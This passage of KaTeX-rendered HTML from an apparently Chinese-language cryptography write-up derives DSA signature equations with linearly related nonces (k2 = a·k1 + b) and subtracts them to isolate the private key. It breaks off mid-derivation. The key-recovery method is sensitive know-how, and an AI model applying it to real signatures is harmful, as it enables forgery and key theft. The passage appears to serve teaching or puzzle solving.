style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">以</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">把</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">带</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">去</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">减</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">：</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span 